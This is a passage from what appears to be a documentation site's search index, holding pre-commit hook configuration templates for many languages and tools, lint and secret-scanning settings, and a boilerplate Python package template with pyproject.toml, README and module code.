'@typescript-eslint/eslint-plugin@6.19.0'\n          - eslint-config-prettier@9.1.0\n        args: ['--fix']\n\n  # Prettier - Code formatter\n  - repo: https://github.com/pre-commit/mirrors-prettier\n    rev: v3.1.0\n    hooks:\n      - id: prettier\n        files: \\.(js|ts|jsx|tsx|json|yaml|yml|md)$\n        args: ['--write']\n\n  # TypeScript compiler check\n  - repo: https://github.com/pre-commit/mirrors-tsc\n    rev: v5.3.3\n    hooks:\n      - id: tsc\n        pass_filenames: false\n        args: ['--noEmit']\n</code></pre>","tags":["pre-commit","git-hooks","quality","automation","linting"]},{"location":"04_templates/precommit_config_template/#terraform-projects","title":"Terraform Projects","text":"<pre><code>repos:\n  # General hooks\n  - repo: https://github.com/pre-commit/pre-commit-hooks\n    rev: v4.5.0\n    hooks:\n      - id: trailing-whitespace\n      - id: end-of-file-fixer\n      - id: check-yaml\n      - id: check-added-large-files\n      - id: check-merge-conflict\n\n  # Terraform hooks\n  - repo: https://github.com/antonbabenko/pre-commit-terraform\n    rev: v1.86.0\n    hooks:\n      - id: terraform_fmt\n      - id: terraform_validate\n      - id: terraform_docs\n        args:\n          - '--args=--lockfile=false'\n      - id: terraform_tflint\n        args:\n          - '--args=--config=__GIT_WORKING_DIR__/.tflint.hcl'\n      - id: terraform_tfsec\n        args:\n          - '--args=--minimum-severity=MEDIUM'\n      - id: terraform_checkov\n        args:\n          - '--args=--quiet'\n          - '--args=--framework=terraform'\n\n  # Terragrunt hooks\n  - repo: https://github.com/antonbabenko/pre-commit-terraform\n    rev: v1.86.0\n    hooks:\n      - id: terragrunt_fmt\n      - id: terragrunt_validate\n\n  # TFLint config validation\n  - repo: https://github.com/terraform-linters/tflint\n    rev: v0.50.0\n    hooks:\n      - id: tflint\n        args: ['--config=.tflint.hcl']\n</code></pre>","tags":["pre-commit","git-hooks","quality","automation","linting"]},{"location":"04_templates/precommit_config_template/#ansible-projects","title":"Ansible Projects","text":"<pre><code>repos:\n  # General hooks\n  - repo: https://github.com/pre-commit/pre-commit-hooks\n    rev: v4.5.0\n    hooks:\n      - id: trailing-whitespace\n      - id: end-of-file-fixer\n      - id: check-yaml\n      - id: check-added-large-files\n      - id: check-merge-conflict\n\n  # Ansible Lint\n  - repo: https://github.com/ansible/ansible-lint\n    rev: v6.22.1\n    hooks:\n      - id: ansible-lint\n        files: \\.(yaml|yml)$\n        args: ['--force-color']\n\n  # YAML Lint\n  - repo: https://github.com/adrienverge/yamllint\n    rev: v1.33.0\n    hooks:\n      - id: yamllint\n        args: ['-c=.yamllint.yml']\n</code></pre>","tags":["pre-commit","git-hooks","quality","automation","linting"]},{"location":"04_templates/precommit_config_template/#bash-scripts","title":"Bash Scripts","text":"<pre><code>repos:\n  # General hooks\n  - repo: https://github.com/pre-commit/pre-commit-hooks\n    rev: v4.5.0\n    hooks:\n      - id: trailing-whitespace\n      - id: end-of-file-fixer\n      - id: check-added-large-files\n      - id: check-merge-conflict\n      - id: check-executables-have-shebangs\n      - id: check-shebang-scripts-are-executable\n\n  # ShellCheck - Shell script linting\n  - repo: https://github.com/shellcheck-py/shellcheck-py\n    rev: v0.9.0.6\n    hooks:\n      - id: shellcheck\n        args: ['--severity=warning']\n\n  # shfmt - Shell script formatter\n  - repo: https://github.com/scop/pre-commit-shfmt\n    rev: v3.8.0-1\n    hooks:\n      - id: shfmt\n        args: ['-i', '2', '-ci', '-w']\n</code></pre>","tags":["pre-commit","git-hooks","quality","automation","linting"]},{"location":"04_templates/precommit_config_template/#docker-projects","title":"Docker Projects","text":"<pre><code>repos:\n  # General hooks\n  - repo: https://github.com/pre-commit/pre-commit-hooks\n    rev: v4.5.0\n    hooks:\n      - id: trailing-whitespace\n      - id: end-of-file-fixer\n      - id: check-yaml\n      - id: check-added-large-files\n      - id: check-merge-conflict\n\n  # Hadolint - Dockerfile linting\n  - repo: https://github.com/hadolint/hadolint\n    rev: v2.12.0\n    hooks:\n      - id: hadolint-docker\n        args: ['--ignore', 'DL3008', '--ignore', 'DL3009']\n\n  # Docker Compose validation\n  - repo: https://github.com/IamTheFij/docker-pre-commit\n    rev: v3.0.1\n    hooks:\n      - id: docker-compose-check\n</code></pre>","tags":["pre-commit","git-hooks","quality","automation","linting"]},{"location":"04_templates/precommit_config_template/#kubernetes-helm","title":"Kubernetes / Helm","text":"<pre><code>repos:\n  # General hooks\n  - repo: https://github.com/pre-commit/pre-commit-hooks\n    rev: v4.5.0\n    hooks:\n      - id: trailing-whitespace\n      - id: end-of-file-fixer\n      - id: check-yaml\n      - id: check-added-large-files\n      - id: check-merge-conflict\n\n  # Kubernetes manifest validation\n  - repo: https://github.com/Lucas-C/pre-commit-hooks\n    rev: v1.5.4\n    hooks:\n      - id: insert-license\n        files: \\.(yaml|yml)$\n        args:\n          - '--license-filepath'\n          - 'LICENSE.txt'\n          - '--comment-style'\n          - '#'\n\n  # Helm lint\n  - repo: https://github.com/gruntwork-io/pre-commit\n    rev: v0.1.23\n    hooks:\n      - id: helmlint\n\n  # Kubeval - Kubernetes manifest validation\n  - repo: https://github.com/instrumenta/kubeval\n    rev: v0.16.1\n    hooks:\n      - id: kubeval\n        files: \\.yaml$\n</code></pre>","tags":["pre-commit","git-hooks","quality","automation","linting"]},{"location":"04_templates/precommit_config_template/#multi-language-projects","title":"Multi-Language Projects","text":"<pre><code>repos:\n  # ==========================================\n  # General Checks\n  # ==========================================\n  - repo: https://github.com/pre-commit/pre-commit-hooks\n    rev: v4.5.0\n    hooks:\n      - id: trailing-whitespace\n      - id: end-of-file-fixer\n      - id: check-yaml\n        args: ['--allow-multiple-documents']\n      - id: check-json\n      - id: check-toml\n      - id: check-xml\n      - id: check-added-large-files\n        args: ['--maxkb=1000']\n      - id: check-merge-conflict\n      - id: check-case-conflict\n      - id: check-symlinks\n      - id: destroyed-symlinks\n      - id: mixed-line-ending\n        args: ['--fix=lf']\n      - id: detect-private-key\n\n  # ==========================================\n  # Python\n  # ==========================================\n  - repo: https://github.com/psf/black\n    rev: 23.12.1\n    hooks:\n      - id: black\n        language_version: python3.10\n\n  - repo: https://github.com/astral-sh/ruff-pre-commit\n    rev: v0.1.9\n    hooks:\n      - id: ruff\n        args: ['--fix']\n\n  - repo: https://github.com/pre-commit/mirrors-mypy\n    rev: v1.8.0\n    hooks:\n      - id: mypy\n        additional_dependencies: [types-all]\n\n  # ==========================================\n  # TypeScript / JavaScript\n  # ==========================================\n  - repo: https://github.com/pre-commit/mirrors-eslint\n    rev: v8.56.0\n    hooks:\n      - id: eslint\n        files: \\.(js|ts|jsx|tsx)$\n        additional_dependencies:\n          - eslint@8.56.0\n          - '@typescript-eslint/parser@6.19.0'\n          - '@typescript-eslint/eslint-plugin@6.19.0'\n        args: ['--fix']\n\n  - repo: https://github.com/pre-commit/mirrors-prettier\n    rev: v3.1.0\n    hooks:\n      - id: prettier\n        files: \\.(js|ts|jsx|tsx|json|yaml|yml|md)$\n\n  # ==========================================\n  # Terraform\n  # ==========================================\n  - repo: https://github.com/antonbabenko/pre-commit-terraform\n    rev: v1.86.0\n    hooks:\n      - id: terraform_fmt\n      - id: terraform_validate\n      - id: terraform_tflint\n\n  # ==========================================\n  # Shell Scripts\n  # ==========================================\n  - repo: https://github.com/shellcheck-py/shellcheck-py\n    rev: v0.9.0.6\n    hooks:\n      - id: shellcheck\n\n  - repo: https://github.com/scop/pre-commit-shfmt\n    rev: v3.8.0-1\n    hooks:\n      - id: shfmt\n        args: ['-i', '2', '-ci', '-w']\n\n  # ==========================================\n  # Docker\n  # ==========================================\n  - repo: https://github.com/hadolint/hadolint\n    rev: v2.12.0\n    hooks:\n      - id: hadolint-docker\n\n  # ==========================================\n  # YAML\n  # ==========================================\n  - repo: https://github.com/adrienverge/yamllint\n    rev: v1.33.0\n    hooks:\n      - id: yamllint\n        args: ['-c=.yamllint.yml']\n\n  # ==========================================\n  # Markdown\n  # ==========================================\n  - repo: https://github.com/igorshubovych/markdownlint-cli\n    rev: v0.38.0\n    hooks:\n      - id: markdownlint\n        args: ['--fix']\n\n  # ==========================================\n  # Security Scanning\n  # ==========================================\n  - repo: https://github.com/Yelp/detect-secrets\n    rev: v1.4.0\n    hooks:\n      - id: detect-secrets\n        args: ['--baseline', '.secrets.baseline']\n\n  # ==========================================\n  # Git Commit Messages\n  # ==========================================\n  - repo: https://github.com/jorisroovers/gitlint\n    rev: v0.19.1\n    hooks:\n      - id: gitlint\n        stages: [commit-msg]\n</code></pre>","tags":["pre-commit","git-hooks","quality","automation","linting"]},{"location":"04_templates/precommit_config_template/#language-specific-configurations","title":"Language-Specific Configurations","text":"","tags":["pre-commit","git-hooks","quality","automation","linting"]},{"location":"04_templates/precommit_config_template/#go-projects","title":"Go Projects","text":"<pre><code>repos:\n  - repo: https://github.com/pre-commit/pre-commit-hooks\n    rev: v4.5.0\n    hooks:\n      - id: trailing-whitespace\n      - id: end-of-file-fixer\n      - id: check-added-large-files\n\n  # Go formatting\n  - repo: https://github.com/dnephin/pre-commit-golang\n    rev: v0.5.1\n    hooks:\n      - id: go-fmt\n      - id: go-vet\n      - id: go-imports\n      - id: go-cyclo\n        args: ['-over=15']\n      - id: validate-toml\n      - id: no-go-testing\n      - id: golangci-lint\n      - id: go-unit-tests\n</code></pre>","tags":["pre-commit","git-hooks","quality","automation","linting"]},{"location":"04_templates/precommit_config_template/#sql-projects","title":"SQL Projects","text":"<pre><code>repos:\n  - repo: https://github.com/pre-commit/pre-commit-hooks\n    rev: v4.5.0\n    hooks:\n      - id: trailing-whitespace\n      - id: end-of-file-fixer\n      - id: check-added-large-files\n\n  # SQL formatting and linting\n  - repo: https://github.com/sqlfluff/sqlfluff\n    rev: 2.3.5\n    hooks:\n      - id: sqlfluff-lint\n        args: ['--dialect=postgres']\n      - id: sqlfluff-fix\n        args: ['--dialect=postgres']\n</code></pre>","tags":["pre-commit","git-hooks","quality","automation","linting"]},{"location":"04_templates/precommit_config_template/#configuration-files","title":"Configuration Files","text":"","tags":["pre-commit","git-hooks","quality","automation","linting"]},{"location":"04_templates/precommit_config_template/#yamllintyml","title":".yamllint.yml","text":"<pre><code>extends: default\n\nrules:\n  line-length:\n    max: 120\n    level: warning\n  indentation:\n    spaces: 2\n    indent-sequences: true\n  comments:\n    min-spaces-from-content: 1\n  document-start: disable\n  truthy:\n    allowed-values: ['true', 'false', 'yes', 'no']\n</code></pre>","tags":["pre-commit","git-hooks","quality","automation","linting"]},{"location":"04_templates/precommit_config_template/#markdownlintjson","title":".markdownlint.json","text":"<pre><code>{\n  \"default\": true,\n  \"MD013\": {\n    \"line_length\": 120,\n    \"code_blocks\": false,\n    \"tables\": false\n  },\n  \"MD033\": false,\n  \"MD041\": false\n}\n</code></pre>","tags":["pre-commit","git-hooks","quality","automation","linting"]},{"location":"04_templates/precommit_config_template/#secretsbaseline","title":".secrets.baseline","text":"<pre><code>{\n  \"version\": \"1.4.0\",\n  \"plugins_used\": [\n    {\n      \"name\": \"ArtifactoryDetector\"\n    },\n    {\n      \"name\": \"AWSKeyDetector\"\n    },\n    {\n      \"name\": \"Base64HighEntropyString\",\n      \"limit\": 4.5\n    },\n    {\n      \"name\": \"BasicAuthDetector\"\n    },\n    {\n      \"name\": \"CloudantDetector\"\n    },\n    {\n      \"name\": \"HexHighEntropyString\",\n      \"limit\": 3.0\n    },\n    {\n      \"name\": \"JwtTokenDetector\"\n    },\n    {\n      \"name\": \"KeywordDetector\"\n    },\n    {\n      \"name\": \"MailchimpDetector\"\n    },\n    {\n      \"name\": \"PrivateKeyDetector\"\n    },\n    {\n      \"name\": \"SlackDetector\"\n    },\n    {\n      \"name\": \"SoftlayerDetector\"\n    },\n    {\n      \"name\": \"StripeDetector\"\n    },\n    {\n      \"name\": \"TwilioKeyDetector\"\n    }\n  ],\n  \"filters_used\": [\n    {\n      \"path\": \"detect_secrets.filters.allowlist.is_line_allowlisted\"\n    },\n    {\n      \"path\": \"detect_secrets.filters.common.is_baseline_file\",\n      \"filename\": \".secrets.baseline\"\n    },\n    {\n      \"path\": \"detect_secrets.filters.heuristic.is_indirect_reference\"\n    }\n  ],\n  \"results\": {},\n  \"generated_at\": \"2025-01-01T00:00:00Z\"\n}\n</code></pre>","tags":["pre-commit","git-hooks","quality","automation","linting"]},{"location":"04_templates/precommit_config_template/#best-practices","title":"Best Practices","text":"","tags":["pre-commit","git-hooks","quality","automation","linting"]},{"location":"04_templates/precommit_config_template/#running-pre-commit-hooks","title":"Running Pre-commit Hooks","text":"<pre><code>## Run hooks against all files\npre-commit run --all-files\n\n## Run specific hook\npre-commit run black --all-files\n\n## Run hooks against staged files only\npre-commit run\n\n## Skip hooks for a specific commit (use sparingly)\ngit commit --no-verify -m \"message\"\n\n## Update all hooks to latest versions\npre-commit autoupdate\n</code></pre>","tags":["pre-commit","git-hooks","quality","automation","linting"]},{"location":"04_templates/precommit_config_template/#performance-optimization","title":"Performance Optimization","text":"<pre><code>## Use local hooks for faster execution\n- repo: local\n  hooks:\n    - id: pytest-check\n      name: pytest-check\n      entry: pytest\n      language: system\n      pass_filenames: false\n      always_run: true\n\n## Limit files checked\n- id: mypy\n  files: ^src/\n  exclude: ^tests/\n\n## Use stages for specific git operations\n- id: pytest\n  stages: [push]\n</code></pre>","tags":["pre-commit","git-hooks","quality","automation","linting"]},{"location":"04_templates/precommit_config_template/#cicd-integration","title":"CI/CD Integration","text":"<pre><code>## GitHub Actions example\nname: Pre-commit\n\non:\n  pull_request:\n  push:\n    branches: [main]\n\njobs:\n  pre-commit:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n      - uses: actions/setup-python@v5\n        with:\n          python-version: '3.10'\n      - uses: pre-commit/action@v3.0.0\n</code></pre>","tags":["pre-commit","git-hooks","quality","automation","linting"]},{"location":"04_templates/precommit_config_template/#common-hooks-reference","title":"Common Hooks Reference","text":"","tags":["pre-commit","git-hooks","quality","automation","linting"]},{"location":"04_templates/precommit_config_template/#file-checks","title":"File Checks","text":"<ul> <li><code>trailing-whitespace</code> - Remove trailing whitespace</li> <li><code>end-of-file-fixer</code> - Ensure files end with newline</li> <li><code>check-yaml</code> - Validate YAML syntax</li> <li><code>check-json</code> - Validate JSON syntax</li> <li><code>check-toml</code> - Validate TOML syntax</li> <li><code>check-added-large-files</code> - Prevent large files</li> <li><code>check-merge-conflict</code> - Check for merge conflict markers</li> </ul>","tags":["pre-commit","git-hooks","quality","automation","linting"]},{"location":"04_templates/precommit_config_template/#security","title":"Security","text":"<ul> <li><code>detect-private-key</code> - Detect private keys</li> <li><code>detect-secrets</code> - Scan for secrets and credentials</li> <li><code>bandit</code> - Python security issues</li> <li><code>safety</code> - Python dependency vulnerabilities</li> </ul>","tags":["pre-commit","git-hooks","quality","automation","linting"]},{"location":"04_templates/precommit_config_template/#formatting","title":"Formatting","text":"<ul> <li><code>black</code> - Python code formatter</li> <li><code>prettier</code> - JavaScript/TypeScript/JSON/Markdown formatter</li> <li><code>terraform_fmt</code> - Terraform formatter</li> <li><code>shfmt</code> - Shell script formatter</li> </ul>","tags":["pre-commit","git-hooks","quality","automation","linting"]},{"location":"04_templates/precommit_config_template/#linting","title":"Linting","text":"<ul> <li><code>ruff</code> - Fast Python linter</li> <li><code>eslint</code> - JavaScript/TypeScript linter</li> <li><code>shellcheck</code> - Shell script linter</li> <li><code>hadolint</code> - Dockerfile linter</li> <li><code>tflint</code> - Terraform linter</li> <li><code>ansible-lint</code> - Ansible linter</li> </ul>","tags":["pre-commit","git-hooks","quality","automation","linting"]},{"location":"04_templates/precommit_config_template/#references","title":"References","text":"","tags":["pre-commit","git-hooks","quality","automation","linting"]},{"location":"04_templates/precommit_config_template/#official-documentation","title":"Official Documentation","text":"<ul> <li>Pre-commit Documentation</li> <li>Pre-commit Hooks Repository</li> <li>Supported Hooks</li> </ul>","tags":["pre-commit","git-hooks","quality","automation","linting"]},{"location":"04_templates/precommit_config_template/#language-specific-hook-repositories","title":"Language-Specific Hook Repositories","text":"<ul> <li>pre-commit-terraform</li> <li>pre-commit-golang</li> <li>ansible-lint</li> </ul>","tags":["pre-commit","git-hooks","quality","automation","linting"]},{"location":"04_templates/precommit_config_template/#tools","title":"Tools","text":"<ul> <li>pre-commit.ci - Continuous integration for pre-commit</li> <li>detect-secrets - Secret detection</li> <li>hadolint - Dockerfile linter</li> </ul> <p>Version: 1.0.0 Last Updated: 2025-10-28 Status: Active</p>","tags":["pre-commit","git-hooks","quality","automation","linting"]},{"location":"04_templates/python_package_template/","title":"Python Package Template","text":"","tags":["python","package","template","pyproject"]},{"location":"04_templates/python_package_template/#overview","title":"Overview","text":"<p>This template provides a complete structure for creating modern Python packages using <code>pyproject.toml</code> and the src layout. Follows PEP 517, PEP 518, and modern Python packaging best practices.</p>","tags":["python","package","template","pyproject"]},{"location":"04_templates/python_package_template/#package-structure","title":"Package Structure","text":"<pre><code>my-package/\n\u251c\u2500\u2500 src/\n\u2502   \u2514\u2500\u2500 my_package/\n\u2502       \u251c\u2500\u2500 __init__.py\n\u2502       \u251c\u2500\u2500 __main__.py\n\u2502       \u251c\u2500\u2500 core.py\n\u2502       \u251c\u2500\u2500 utils.py\n\u2502       \u2514\u2500\u2500 py.typed\n\u251c\u2500\u2500 tests/\n\u2502   \u251c\u2500\u2500 __init__.py\n\u2502   \u251c\u2500\u2500 conftest.py\n\u2502   \u251c\u2500\u2500 test_core.py\n\u2502   \u2514\u2500\u2500 test_utils.py\n\u251c\u2500\u2500 docs/\n\u2502   \u251c\u2500\u2500 conf.py\n\u2502   \u251c\u2500\u2500 index.md\n\u2502   \u2514\u2500\u2500 api.md\n\u251c\u2500\u2500 examples/\n\u2502   \u2514\u2500\u2500 basic_usage.py\n\u251c\u2500\u2500 .github/\n\u2502   \u2514\u2500\u2500 workflows/\n\u2502       \u251c\u2500\u2500 ci.yml\n\u2502       \u2514\u2500\u2500 release.yml\n\u251c\u2500\u2500 pyproject.toml\n\u251c\u2500\u2500 README.md\n\u251c\u2500\u2500 LICENSE\n\u251c\u2500\u2500 CHANGELOG.md\n\u251c\u2500\u2500 .gitignore\n\u251c\u2500\u2500 .pre-commit-config.yaml\n\u2514\u2500\u2500 Makefile\n</code></pre>","tags":["python","package","template","pyproject"]},{"location":"04_templates/python_package_template/#pyprojecttoml-template","title":"pyproject.toml Template","text":"<pre><code>[build-system]\nrequires = [\"setuptools&gt;=68.0\", \"wheel\"]\nbuild-backend = \"setuptools.build_meta\"\n\n[project]\nname = \"my-package\"\nversion = \"0.1.0\"\ndescription = \"A short description of the package\"\nreadme = \"README.md\"\nauthors = [\n    {name = \"Your Name\", email = \"your.email@example.com\"}\n]\nlicense = {text = \"MIT\"}\nclassifiers = [\n    \"Development Status :: 3 - Alpha\",\n    \"Intended Audience :: Developers\",\n    \"License :: OSI Approved :: MIT License\",\n    \"Programming Language :: Python :: 3\",\n    \"Programming Language :: Python :: 3.10\",\n    \"Programming Language :: Python :: 3.11\",\n    \"Programming Language :: Python :: 3.12\",\n]\nkeywords = [\"example\", \"package\", \"template\"]\nrequires-python = \"&gt;=3.10\"\ndependencies = [\n    \"requests&gt;=2.31.0\",\n    \"pydantic&gt;=2.0.0\",\n]\n\n[project.optional-dependencies]\ndev = [\n    \"pytest&gt;=7.4.0\",\n    \"pytest-cov&gt;=4.1.0\",\n    \"pytest-asyncio&gt;=0.21.0\",\n    \"black&gt;=23.7.0\",\n    \"ruff&gt;=0.0.280\",\n    \"mypy&gt;=1.4.0\",\n    \"pre-commit&gt;=3.3.0\",\n]\ndocs = [\n    \"mkdocs&gt;=1.5.0\",\n    \"mkdocs-material&gt;=9.1.0\",\n    \"mkdocstrings[python]&gt;=0.22.0\",\n]\n\n[project.urls]\nHomepage = \"https://github.com/yourusername/my-package\"\nDocumentation = \"https://my-package.readthedocs.io\"\nRepository = \"https://github.com/yourusername/my-package\"\nIssues = \"https://github.com/yourusername/my-package/issues\"\n\n[project.scripts]\nmy-package = \"my_package.__main__:main\"\n\n[tool.setuptools]\npackage-dir = {\"\" = \"src\"}\n\n[tool.setuptools.packages.find]\nwhere = [\"src\"]\ninclude = [\"my_package*\"]\n\n[tool.setuptools.package-data]\nmy_package = [\"py.typed\"]\n\n## Black configuration\n[tool.black]\nline-length = 100\ntarget-version = [\"py310\", \"py311\", \"py312\"]\ninclude = '\\.pyi?$'\n\n## Ruff configuration\n[tool.ruff]\nline-length = 100\ntarget-version = \"py310\"\nselect = [\n    \"E\",   # pycodestyle errors\n    \"W\",   # pycodestyle warnings\n    \"F\",   # pyflakes\n    \"I\",   # isort\n    \"B\",   # flake8-bugbear\n    \"C4\",  # flake8-comprehensions\n    \"UP\",  # pyupgrade\n]\nignore = []\n\n[tool.ruff.isort]\nknown-first-party = [\"my_package\"]\n\n## MyPy configuration\n[tool.mypy]\npython_version = \"3.10\"\nwarn_return_any = true\nwarn_unused_configs = true\ndisallow_untyped_defs = true\ndisallow_incomplete_defs = true\ncheck_untyped_defs = true\nno_implicit_optional = true\nwarn_redundant_casts = true\nwarn_unused_ignores = true\nwarn_no_return = true\n\n[[tool.mypy.overrides]]\nmodule = \"tests.*\"\ndisallow_untyped_defs = false\n\n## Pytest configuration\n[tool.pytest.ini_options]\ntestpaths = [\"tests\"]\npython_files = \"test_*.py\"\npython_classes = \"Test*\"\npython_functions = \"test_*\"\naddopts = [\n    \"--verbose\",\n    \"--cov=my_package\",\n    \"--cov-report=term-missing\",\n    \"--cov-report=html\",\n    \"--cov-report=xml\",\n]\n\n## Coverage configuration\n[tool.coverage.run]\nsource = [\"src\"]\nomit = [\"tests/*\", \"**/__main__.py\"]\n\n[tool.coverage.report]\nexclude_lines = [\n    \"pragma: no cover\",\n    \"def __repr__\",\n    \"raise AssertionError\",\n    \"raise NotImplementedError\",\n    \"if __name__ == .__main__.:\",\n    \"if TYPE_CHECKING:\",\n]\n</code></pre>","tags":["python","package","template","pyproject"]},{"location":"04_templates/python_package_template/#readmemd-template","title":"README.md Template","text":"<pre><code>## My Package\n\n[![PyPI version](https://badge.fury.io/py/my-package.svg)](https://badge.fury.io/py/my-package)\n[![Python versions](https://img.shields.io/pypi/pyversions/my-package.svg)](https://pypi.org/project/my-package/)\n[![CI](https://github.com/yourusername/my-package/workflows/CI/badge.svg)](https://github.com/yourusername/my-package/actions)\n[![codecov](https://codecov.io/gh/yourusername/my-package/branch/main/graph/badge.svg)](https://codecov.io/gh/yourusername/my-package)\n[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)\n\nA short, compelling description of your package.\n\n## Features\n\n- \u2728 Feature 1: Brief description\n- \ud83d\ude80 Feature 2: Brief description\n- \ud83d\udee1\ufe0f Feature 3: Brief description\n- \ud83d\udce6 Feature 4: Brief description\n\n## Installation\n\n\\```bash\npip install my-package\n\\```\n\nFor development:\n\n\\```bash\npip install my-package[dev]\n\\```\n\n## Quick Start\n\n\\```python\nfrom my_package import MyClass\n\n## Basic usage\nobj = MyClass()\nresult = obj.do_something()\nprint(result)\n\\```\n\n## Usage Examples\n\n### Example 1: Basic Usage\n\n\\```python\nfrom my_package import core\n\n## Use the main functionality\nresult = core.process_data(input_data)\n\\```\n\n### Example 2: Advanced Usage\n\n\\```python\nfrom my_package import core, utils\n\n## Advanced configuration\nconfig = utils.load_config(\"config.yaml\")\nprocessor = core.DataProcessor(config)\nresult = processor.run()\n\\```\n\n## CLI Usage\n\n\\```bash\n## Run the CLI\nmy-package --help\n\n## Basic command\nmy-package process input.txt\n\n## With options\nmy-package process input.txt --output output.txt --verbose\n\\```\n\n## Documentation\n\nFull documentation is available at [https://my-package.readthedocs.io](https://my-package.readthedocs.io)\n\n## Development\n\n### Setup\n\n\\```bash\n## Clone the repository\ngit clone https://github.com/yourusername/my-package.git\ncd my-package\n\n## Create virtual environment\npython -m venv venv\nsource venv/bin/activate  # On Windows: venv\\Scripts\\activate\n\n## Install dependencies\npip install -e \".[dev]\"\n\n## Install pre-commit hooks\npre-commit install\n\\```\n\n### Running Tests\n\n\\```bash\n## Run tests\npytest\n\n## With coverage\npytest --cov\n\n## Run specific test\npytest tests/test_core.py::test_specific_function\n\\```\n\n### Code Quality\n\n\\```bash\n## Format code\nblack src tests\n\n## Lint code\nruff check src tests\n\n## Type checking\nmypy src\n\\```\n\n### Documentation\n\n\\```bash\n## Build documentation\ncd docs\nmkdocs build\n\n## Serve documentation locally\nmkdocs serve\n\\```\n\n## Contributing\n\nContributions are welcome! Please see [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines.\n\n1. Fork the repository\n2. Create a feature branch (`git checkout -b feature/amazing-feature`)\n3. Commit your changes (`git commit -m 'Add amazing feature'`)\n4. Push to the branch (`git push origin feature/amazing-feature`)\n5. Open a Pull Request\n\n## License\n\nThis project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.\n\n## Changelog\n\nSee [CHANGELOG.md](CHANGELOG.md) for a list of changes.\n\n## Authors\n\n- Your Name - [@yourhandle](https://github.com/yourusername)\n\n## Acknowledgments\n\n- Inspiration or libraries used\n- Contributors\n</code></pre>","tags":["python","package","template","pyproject"]},{"location":"04_templates/python_package_template/#srcmy_packageinitpy-template","title":"src/my_package/init.py Template","text":"<pre><code>\"\"\"My Package - A description of the package.\"\"\"\n\nfrom my_package.core import MyClass, process_data\nfrom my_package.utils import load_config, setup_logging\n\n__version__ = \"0.1.0\"\n__all__ = [\n    \"MyClass\",\n    \"process_data\",\n    \"load_config\",\n    \"setup_logging\",\n]\n</code></pre>","tags":["python","package","template","pyproject"]},{"location":"04_templates/python_package_template/#srcmy_packagemainpy-template","title":"src/my_package/main.py Template","text":"<pre><code>\"\"\"CLI entry point for my-package.\"\"\"\n\nimport argparse\nimport sys\nfrom pathlib import Path\nfrom typing import Optional\n\nfrom my_package import __version__\nfrom my_package.core import process_data\nfrom my_package.utils import setup_logging\n\ndef parse_args(args: Optional[list[str]] = None) -&gt; argparse.Namespace:\n    \"\"\"Parse command line arguments.\n\n    Args:\n        args: Command line arguments (defaults to sys.argv[1:])\n\n    Returns:\n        Parsed arguments\n    \"\"\"\n    parser = argparse.ArgumentParser(\n        prog=\"my-package\",\n        description=\"A description of the CLI tool\",\n    )\n\n    parser.add_argument(\n        \"--version\",\n        action=\"version\",\n        version=f\"%(prog)s {__version__}\",\n    )\n\n    parser.add_argument(\n        \"input_file\",\n        type=Path,\n        help=\"Input file to process\",\n    )\n\n    parser.add_argument(\n        \"-o\",\n        \"--output\",\n        type=Path,\n        help=\"Output file (default: stdout)\",\n    )\n\n    parser.add_argument(\n        \"-v\",\n        \"--verbose\",\n        action=\"store_true\",\n        help=\"Enable verbose output\",\n    )\n\n    return parser.parse_args(args)\n\ndef main(args: Optional[list[str]] = None) -&gt; int:\n    \"\"\"Main CLI entry point.\n\n    Args:\n        args: Command line arguments\n\n    Returns:\n        Exit code (0 for success, non-zero for failure)\n    \"\"\"\n    parsed_args = parse_args(args)\n\n    # Setup logging\n    log_level = \"DEBUG\" if parsed_args.verbose else \"INFO\"\n    setup_logging(log_level)\n\n    try:\n        # Process input\n        result = process_data(parsed_args.input_file)\n\n        # Write output\n        if parsed_args.output:\n            parsed_args.output.write_text(result)\n        else:\n            print(result)\n\n        return 0\n\n    except Exception as e:\n        print(f\"Error: {e}\", file=sys.stderr)\n        return 1\n\nif __name__ == \"__main__\":\n    sys.exit(main())\n</code></pre>","tags":["python","package","template","pyproject"]},{"location":"04_templates/python_package_template/#srcmy_packagecorepy-template","title":"src/my_package/core.py Template","text":"<pre><code>\"\"\"Core functionality for my-package.\"\"\"\n\nfrom pathlib import Path\nfrom typing import Any\n\nclass MyClass:\n    \"\"\"Main class for the package.\n\n    Args:\n        config: Configuration dictionary\n\n    Attributes:\n        config: Configuration dictionary\n    \"\"\"\n\n    def __init__(self, config: dict[str, Any] | None = None) -&gt; None:\n        \"\"\"Initialize MyClass.\"\"\"\n        self.config = config or {}\n\n    def do_something(self) -&gt; str:\n        \"\"\"Perform the main action.\n\n        Returns:\n            Result string\n\n        Raises:\n            ValueError: If configuration is invalid\n        \"\"\"\n        if not self.config:\n            raise ValueError(\"Configuration is required\")\n\n        return \"Result of doing something\"\n\ndef process_data(input_file: Path) -&gt; str:\n    \"\"\"Process input data from a file.\n\n    Args:\n        input_file: Path to input file\n\n    Returns:\n        Processed data as string\n\n    Raises:\n        FileNotFoundError: If input file doesn't exist\n        ValueError: If input file is invalid\n    \"\"\"\n    if not input_file.exists():\n        raise FileNotFoundError(f\"Input file not found: {input_file}\")\n\n    content = input_file.read_text()\n\n    if not content:\n        raise ValueError(\"Input file is empty\")\n\n    # Process the content\n    result = content.upper()\n\n    return result\n</code></pre>","tags":["python","package","template","pyproject"]},{"location":"04_templates/python_package_template/#srcmy_packageutilspy-template","title":"src/my_package/utils.py Template","text":"<pre><code>\"\"\"Utility functions for my-package.\"\"\"\n\nimport logging\nfrom pathlib import Path\nfrom typing import Any\n\nimport yaml\n\ndef setup_logging(level: str = \"INFO\") -&gt; None:\n    \"\"\"Setup logging configuration.\n\n    Args:\n        level: Logging level (DEBUG, INFO, WARNING, ERROR, CRITICAL)\n    \"\"\"\n    logging.basicConfig(\n        level=level,\n        format=\"%(asctime)s - %(name)s - %(levelname)s - %(message)s\",\n        datefmt=\"%Y-%m-%d %H:%M:%S\",\n    )\n\ndef load_config(config_file: Path) -&gt; dict[str, Any]:\n    \"\"\"Load configuration from YAML file.\n\n    Args:\n        config_file: Path to YAML configuration file\n\n    Returns:\n        Configuration dictionary\n\n    Raises:\n        FileNotFoundError: If config file doesn't exist\n        ValueError: If config file is invalid YAML\n    \"\"\"\n    if not config_file.exists():\n        raise FileNotFoundError(f\"Config file not found: {config_file}\")\n\n    try:\n        with config_file.open() as f:\n   